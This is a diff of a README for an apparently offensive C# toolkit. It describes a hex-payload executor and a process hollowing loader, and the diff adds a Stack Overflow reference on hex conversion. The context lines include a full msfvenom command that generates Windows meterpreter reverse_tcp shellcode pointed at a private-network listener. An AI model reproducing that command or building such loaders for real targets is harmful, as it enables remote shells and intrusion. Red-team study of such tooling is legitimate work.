@@ -7,10 +7,10 @@ Programmer needs only to provide a base64 encoded PEM certificate (Ref #3) to ge
 3. https://nmap.org/ncat/guide/ncat-ssl.html
 
 //HexecutableInvoker executes any hexecutable payload provided. 
-It was inspired by a SANS article on malicious JavaScript (Ref #1) as well Reversing Hub's exquisite class on hexecutable malware. Reccomend highly!!! (Ref #2).
-The programmer needs only to replace the namespace & class with that of their payload & then provide the necessary arguments. Convert your payload to .hex format using the instructions provided in ReversingHub's Udemy course linked below.
+It was inspired by a SANS article on malicious JavaScript (Ref #1) as well Reversing Hub's exquisite class on hexecutable malware. Reccomend highly!!! (Ref #2). Additionally the hex converversion process can be understood by studying this stack over flow forum on the same process (Ref #3). The programmer needs only to replace the namespace & class with that of their payload & then provide the necessary arguments. Convert your payload to .hex format using the instructions provided in ReversingHub's Udemy course linked below.
 1. https://isc.sans.edu/forums/diary/Malicious+Script+With+Multiple+Payloads/25090/
 2. https://www.udemy.com/course/reverse-engineering-deep-dive/
+3. https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
 
 //C# Process Hollowing is Gmgorelik's implementation (Ref #1). The shell code being executed was generated using the following msfvenom command:
 msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192[.]168[.]56[.]104 LPORT=56104 -b "\x00" -f cs HollowP.cs 
